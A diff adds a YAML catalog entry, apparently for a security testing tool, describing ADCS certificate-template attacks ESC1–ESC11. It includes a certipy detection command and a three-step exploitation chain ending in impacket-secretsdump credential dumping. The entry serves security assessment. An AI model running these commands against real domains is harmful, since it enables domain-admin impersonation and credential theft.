@@ -1,0 +1,32 @@
+id: ADCS
+name: AD Certificate Services Attacks (ESC1-ESC11)
+cwe: [CWE-295, CWE-269]
+owasp: A07:2021 Authentication Failures
+severity_range: Critical
+description: >
+  ADCS certificate template misconfigurations allow attackers to request
+  certificates that enable authentication as any user, including domain admins.
+  11 known misconfiguration classes (ESC1-ESC11).
+
+detection:
+  tool: certipy-ad
+  command: 'certipy find -u user@domain -p pass -dc-ip <DC>'
+
+attack_classes:
+  ESC1: 'Template allows Enrollee-Supplied Subject + ClientAuth EKU = impersonate any user'
+  ESC2: 'Any Purpose EKU on template = client auth, code signing, anything'
+  ESC3: 'Enrollment Agent template = request certs for other users'
+  ESC4: 'Vulnerable template ACL = low-priv user modifies template'
+  ESC6: 'CA EDITF_ATTRIBUTESUBJECTALTNAME2 = SAN injection on any template'
+  ESC7: 'Vulnerable CA ACL = ManageCA/ManageCertificates abuse'
+  ESC8: 'NTLM relay to /certsrv web enrollment'
+  ESC11: 'Relay to ICPR without encryption requirement'
+
+exploitation_steps:
+  - 'certipy req -u user@domain -p pass -target <CA> -template <vuln_template> -upn administrator@domain'
+  - 'certipy auth -pfx admin.pfx — receive NT hash of administrator'
+  - 'impacket-secretsdump -hashes :<nthash> domain/administrator@<DC>'
+
+references:
+  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
+  - https://github.com/ly4k/Certipy
